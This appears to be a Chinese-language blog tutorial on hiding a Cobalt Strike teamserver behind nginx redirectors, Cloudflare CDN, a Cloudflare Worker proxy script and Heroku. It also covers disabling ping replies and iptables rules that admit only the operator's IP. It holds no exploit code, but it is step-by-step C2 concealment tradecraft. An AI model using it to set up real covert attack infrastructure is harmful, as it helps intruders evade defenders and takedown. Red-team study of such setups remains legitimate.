# Cobalt Strike隐藏技术实践

## Teamserver

1. 更改teamserver的默认端口

2. 关闭ICMP的回显（禁Ping）
   ```bash
   vim /etc/sysctl.conf
   # echo net.ipv4.icmp_echo_ignore_all = 1 > /etc/sysctl.conf
   sysctl -p
   ```
   
   ![](..\img\2021-7-21-7.PNG)

3. 设置iptables，阻止非预期访问。

   ```bash
   iptables -I INPUT -p tcp -s <HACKER_IP> --dport <TEAMSERVER_PORT> -j ACCEPT
   iptables -A INPUT -p tcp --dport <TEAMSERVER_PORT> -j REJECT
   
   iptables -I INPUT -p tcp -s <REDIRECTOR_IP> --dport <LISTENER_PORT> -j ACCEPT
   iptables -A INPUT -p tcp --dport <LISTENER_PORT> -j REJECT
   ```

4. 启动teamserver

5. 为Redirector生成nginx.conf

   ```bash
   git clone https://github.com/threatexpress/cs2modrewrite.git
   cd cs2modrewrite
   python cs2nginx.py -i <CS_PROFILE> -c http://<TEAMSERVER_IP>:<TEAMSERVER_PORT}> -r https://www.google.com -H mydomain.local > nginx.conf
   ```

## Redirector (Nginx转发) -> teamserver

1. 安装 nginx 和 **nginx-extras**

   ```bash
   apt update
   apt install nginx nginx-extras
   ```

2. 将已生成的nginx.conf上传，并覆盖/etc/nginx/nginx.conf

3. 启动nginx

## 使用自己的域名和Cloudflare CDN -> Redirector -> teamserver

1. 把域名NS记录修改至Cloudflare，并等待生效。

2. 在Cloudflare控制台的规则选项中将http-stager的URL特征设置为绕过缓存。设置项为缓存级别-绕过。

   ![](..\img\2021-7-21-1.PNG)

3. 配置Cobalt Strike Listener

   ![](..\img\2021-7-21-2.PNG)

不出意外，此时就能上线了。

理论暴露面：你的域名。

## 使用 CloudFlare Workers -> Redirector -> teamserver

1. CloudFlare 控制台，Workers，创建一个优雅的子域。

2. 创建一个Worker，并使用以下脚本。脚本来自网络。

   ```javascript
   let upstream = 'https://your_domain.com'
   
   addEventListener('fetch', event => {
       event.respondWith(fetchAndApply(event.request));
   })
   
   async function fetchAndApply(request) {
       const ipAddress = request.headers.get('cf-connecting-ip') || '';
       let requestURL = new URL(request.url);
       let upstreamURL = new URL(upstream);
       requestURL.protocol = upstreamURL.protocol;
       requestURL.host = upstreamURL.host;
       requestURL.pathname = upstreamURL.pathname + requestURL.pathname;
   
       let new_request_headers = new Headers(request.headers);
       new_request_headers.set("X-Forwarded-For", ipAddress);
       let fetchedResponse = await fetch(
           new Request(requestURL, {
               method: request.method,
               headers: new_request_headers,
               body: request.body
           })
       );
       let modifiedResponseHeaders = new Headers(fetchedResponse.headers);
       modifiedResponseHeaders.delete('set-cookie');
       return new Response(
           fetchedResponse.body,
           {
               headers: modifiedResponseHeaders,
               status: fetchedResponse.status,
               statusText: fetchedResponse.statusText
           }
       );
   }
   ```

3. 配置Listener

   ![](..\img\2021-7-21-3.PNG)

4. 不出意外，此时就能上线了。测试工作正常。

   ![](..\img\2021-7-21-4.PNG)

   ![](..\img\2021-7-21-5.PNG)

5. 抓包验证一下，配置的子域名正常。

   ![](..\img\2021-7-21-6.PNG)
   
   



## 使用Heroku等可反代的服务 -> Redirector -> teamserver

之前直接用Github模板部署的方案已经被Heroku给ban了，下面的方法经测试仍可用，方案来自互联网。

1. 注册一个Heroku帐号，邮箱就行。

2. 安装heroku-cli，我是Arch Linux所以直接AUR就搞定了，其他发行版请依照官方手册。安装完成后登录。

   注意：普通用户请用sudo，或直接切换到root操作。后面用到docker需要root权限，登录状态和当前用户有关。

   cli登录时会调用浏览器，当然你也可以复制cli中的登录URL到浏览器中打开。

   登录需要cli的IP和浏览器的IP匹配，这个地方需要自己想办法了，举个例子，两者用同一个Proxy。

   ```bash
   yay -S docker git
   # AUR
   yay -S heroku-cli
   
   sudo heroku login
   ```

3. Clone一下这个项目

   ```bash
   git clone https://github.com/rjoonas/heroku-docker-nginx-example.git
   ```

4. 修改default.conf.template，参考配置如下。注意，我这里的结构是heroku->nginx反代实现的redirector->teamserver，如果直接从heroku到teamserver，此处可写判断逻辑：

   ```nginx
   server {
       listen $PORT;
       location / {
           proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
           proxy_pass <Redirector地址>;
       }
   }
   ```

5. 生成、Push并发布，发布后如果需要改名，可以去heroku网页控制台操作。

   ```bash
   # su - root
   heroku container:login
   heroku create
   heroku container:push web
   heroku container:release web
   ```

6. Cobalt Strike那边配置和之前一样

   ![](..\img\2021-7-21-8.PNG)

7. 测试上线成功，功能正常，抓包看效果和上面Cloudflare Workers类似，不再贴图。
